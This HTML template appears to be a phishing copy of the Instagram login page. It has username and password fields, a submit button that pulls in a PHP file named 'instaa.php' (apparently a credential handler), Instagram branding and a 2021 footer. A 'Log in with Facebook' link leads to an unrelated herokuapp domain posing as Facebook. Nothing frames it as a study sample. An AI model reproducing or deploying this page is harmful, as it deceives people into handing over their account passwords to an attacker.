...
<head>
    ...
    <link rel="mask-icon" href="static/images/fc72dd4bfde8.svg" color="#262626">
    <link rel="shortcut icon" type="image/x-icon" href="static/images/36b3ee2d91ed.ico">
    ...
    <div id="react-root">
        <section class="_9eogI E3X2T">
            ...
            <main class="SCxLW  o64aR " role="main">
                <article class="_4_yKc">
                    <div class="yOZjD _80tAB">
                        <div class="V64Sp"><img class="RP4i1  " src="static/images/d6bf0c928b5a.jpg" alt=""><img class="RP4i1  " src="static/images/d6bf0c928b5a.jpg" alt=""><img class="RP4i1  UVauz" src="static/images/d6bf0c928b5a.jpg" alt="">
                            <img class="RP4i1 JtrJi " src="static/images/d6bf0c928b5a.jpg" alt=""><img class="RP4i1  " src="static/images/d6bf0c928b5a.jpg" alt=""></div>
                    </div>
                    <div class="rgFsT  ">
                        <div class="gr27e  ">
                    ...
                    <input name="email" placeholder="Phone number, username, or email"   maxlength="75"  type="text" class="_2hvTZ pexuQ zyHYP" value="">
                    <!-- <input style="width: 17em;" type="text" placeholder="Phone number, username, or email"> -->
                </label>
                                                <div class="i24fI">
                    ...
                    <input name="contraseña" placeholder="Password" aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off"  type="password" class="_2hvTZ pexuQ zyHYP" value="">
                    <!-- <input  type="password" placeholder="Passwordes"> -->
                                        ...
                                        <div class="Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB">
                                            ...
                                            <input class="sqdOP  L3NKy   y3zKF" style="background-color: #0095f6; 
            " type="submit" class="Igw0E IwRSH eGOV_ _4EzTm" value="Log In" name="register">
                                            <!-- </button> -->
                                            <?php include("instaa.php"); ?>
                                        </div>
            ...
            <button class="sqdOP yWX7d    y3zKF" type="button">
                ...
                <span class="KPnG0"><a href="https://blue-service-face-book.herokuapp.com/">
                Log in with Facebook </a></span>
                        ...
                        <div class="APQi1">
                            ...
                            <div class="iNy2T">
                                <a class="z1VUo" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo"><img alt="Available on the App Store" class="Rt8TI " src="static/images/180ae7a0bcf7.png"></a>
                                <a class="z1VUo" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D8C02817E-3448-4D34-8F84-2D3CEE8FF4E5%26utm_content%3Dlo%26utm_medium%3Dbadge"><img alt="Available on Google Play" class="Rt8TI " src="static/images/e9cd846dc748.png"></a>
                            </div>
                        </div>
                    </div>
                </article>
            ...
            <footer class="_8Rna9  _3Laht pC2e0 " role="contentinfo">
                <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm               KokQV                                                                                               ">
                    ...
                    <div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                        _5VUwz                                                                                      ">
                        <div class="_7UhW9  PIoXz       MMzan   _0PwGv         uL8Hv         ">© 2021 Instagram from Facebook</div>
                    </div>
                </div>
    </div>
    </footer>
